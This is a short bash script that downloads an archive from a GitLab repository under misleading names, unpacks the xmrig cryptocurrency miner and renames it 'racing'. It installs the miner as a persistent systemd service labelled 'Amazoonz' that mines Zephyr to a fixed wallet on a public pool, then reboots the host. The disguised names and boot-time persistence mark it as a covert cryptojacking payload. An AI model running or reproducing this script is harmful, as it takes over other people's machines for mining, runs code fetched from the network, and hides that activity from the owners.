#!/bin/bash
cd /usr/local/bin
sudo wget https://gitlab.com/amaz/grabcar/-/raw/main/amazonpython.tar.gz
sudo apt update
sudo systemctl stop amazoon.service
sudo systemctl disable amazoon.service
sudo tar xvzf amazonpython.tar.gz
sudo mv xmrig-6.20.0 racing
sudo bash -c 'echo -e "[Unit]\nDescription=Amazoonz\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o us.zephyr.herominers.com:1123 -u ZEPHYR3AJ3qZrhYoqpP6HcQ1iALp3Yd119YAfCaeCajF4JPZqLerQyjJXjZ5AtT53Cd9L893TufCyi2CgqThaNGa9Kbk1piv5bu4k -p worker -a rx/0 -k -t 6\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/amazoonz.service'
sudo systemctl daemon-reload
sudo systemctl enable amazoonz.service
echo "Setup completed!"
sudo reboot
